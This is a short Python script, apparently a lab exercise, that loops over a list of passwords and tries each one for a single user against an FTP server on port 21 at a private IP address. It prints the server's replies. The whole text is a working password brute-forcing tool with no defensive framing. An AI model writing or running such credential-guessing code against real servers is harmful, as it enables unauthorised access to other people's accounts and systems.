def connection(ip,user,passw):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Trying " + ip + ", " + user + ", " + passw)
    sock.connect((ip,21)) #connection port using ftp
    data = sock.recv(1024) #rec
    sock.send("User " + user  + '\r\n')
    data = sock.recv(1024)
    sock.send("PASS " + passw + '\r\n')
    data = sock.recv(1024)
    sock.send("quit\r\n")
    sock.close()
    return data

user = "test1"
passwords = ["test1","test2","test3","test4"]

for password in passwords:
    print(connection('192.168.146.52',user,password))

